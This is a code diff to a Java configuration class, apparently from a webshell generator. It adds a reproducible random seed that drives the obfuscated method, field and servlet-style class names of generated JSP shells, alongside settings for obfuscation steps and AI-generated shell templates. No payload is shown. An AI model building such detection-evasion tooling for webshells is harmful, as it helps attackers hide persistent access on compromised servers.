@@ -3,11 +3,13 @@ package org.leo.jmg;
 
 import org.leo.core.entity.Disguise;
 import org.leo.core.util.request.ClassNameGenerator;
+import org.leo.core.util.request.GenerationRandom;
 
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
 import java.util.Locale;
+import java.util.concurrent.ThreadLocalRandom;
 
 /**
  * Shell生成器配置类
@@ -55,6 +57,9 @@ public class ShellGeneratorConfig {
      * 为 null 或空时 JSP Packer 使用默认 preset；非空时按此顺序构建 pipeline。
      */
     private List<String> jspObfuscationSteps;
+
+    /** 用于复现一次完整生成过程；默认每个配置生成一个随机 seed。 */
+    private long obfuscationSeed = ThreadLocalRandom.current().nextLong();
 
     /**
      * AI 生成的自定义 JSP 模板（含 {{VAR:}} / {{CLS:}} / {{base64Str}} 占位符）。
@@ -111,17 +116,23 @@ public class ShellGeneratorConfig {
      * 私有构造函数，使用Builder模式
      */
     private ShellGeneratorConfig() {
-        java.util.Set<String> used = new java.util.HashSet<String>();
-        this.methodAction          = ClassNameGenerator.randomMethodName(used);
-        this.methodTestConn        = ClassNameGenerator.randomMethodName(used);
-        this.methodRedirect        = ClassNameGenerator.randomMethodName(used);
-        this.methodLoadComponent   = ClassNameGenerator.randomMethodName(used);
-        this.methodInvokeComponent = ClassNameGenerator.randomMethodName(used);
+        initializeGeneratedNames();
+    }
 
-        this.fieldParams     = ClassNameGenerator.randomFieldName(used);
-        this.fieldResults    = ClassNameGenerator.randomFieldName(used);
-        this.fieldHostId     = ClassNameGenerator.randomFieldName(used);
-        this.fieldComponents = ClassNameGenerator.randomFieldName(used);
+    private void initializeGeneratedNames() {
+        java.util.Set<String> used = new java.util.HashSet<String>();
+        try (GenerationRandom.Scope ignored = GenerationRandom.withSeed(obfuscationSeed)) {
+            this.methodAction          = ClassNameGenerator.randomMethodName(used);
+            this.methodTestConn        = ClassNameGenerator.randomMethodName(used);
+            this.methodRedirect        = ClassNameGenerator.randomMethodName(used);
+            this.methodLoadComponent   = ClassNameGenerator.randomMethodName(used);
+            this.methodInvokeComponent = ClassNameGenerator.randomMethodName(used);
+
+            this.fieldParams      = ClassNameGenerator.randomFieldName(used);
+            this.fieldResults     = ClassNameGenerator.randomFieldName(used);
+            this.fieldHostId      = ClassNameGenerator.randomFieldName(used);
+            this.fieldComponents = ClassNameGenerator.randomFieldName(used);
+        }
     }
     
     /**
@@ -319,6 +330,13 @@ public class ShellGeneratorConfig {
             return this;
         }
 
+        /** 设置固定 seed；相同请求和运行环境下可复现随机化结果。 */
+        public Builder obfuscationSeed(long seed) {
+            config.obfuscationSeed = seed;
+            config.initializeGeneratedNames();
+            return this;
+        }
+
         public Builder customJspTemplate(String template) {
             config.customJspTemplate = template;
             return this;
@@ -330,7 +348,9 @@ public class ShellGeneratorConfig {
         public ShellGeneratorConfig build() {
             // 如果核心类名为空，自动生成
             if (config.coreClassName == null || config.coreClassName.trim().isEmpty()) {
-                config.coreClassName = ClassNameGenerator.generateServletStyleClassName();
+                try (GenerationRandom.Scope ignored = GenerationRandom.withSeed(config.obfuscationSeed)) {
+                    config.coreClassName = ClassNameGenerator.generateServletStyleClassName();
+                }
             }
             return config;
         }
@@ -414,6 +434,10 @@ public class ShellGeneratorConfig {
 
     public List<String> getJspObfuscationSteps() {
         return jspObfuscationSteps;
+    }
+
+    public long getObfuscationSeed() {
+        return obfuscationSeed;
     }
 
     public String getCustomJspTemplate() {
